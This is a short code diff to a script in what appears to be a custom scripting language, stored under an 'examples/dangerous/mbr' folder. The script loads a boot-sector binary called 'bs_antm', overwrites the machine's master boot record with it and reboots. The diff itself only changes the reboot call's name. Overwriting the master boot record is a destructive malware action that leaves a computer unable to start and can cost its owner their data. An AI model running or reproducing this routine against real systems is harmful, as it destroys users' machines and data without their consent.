@@ -7,6 +7,6 @@
 main:{
     mbr.load.binary("examples/dangerous/mbr/anthem/bs_antm"); @ Load the binary file
     mbr.overwrite(); @ Overwrite the mbr
-    system.reboot();
+    system.command.reboot();
     @system.exit("0");
 }
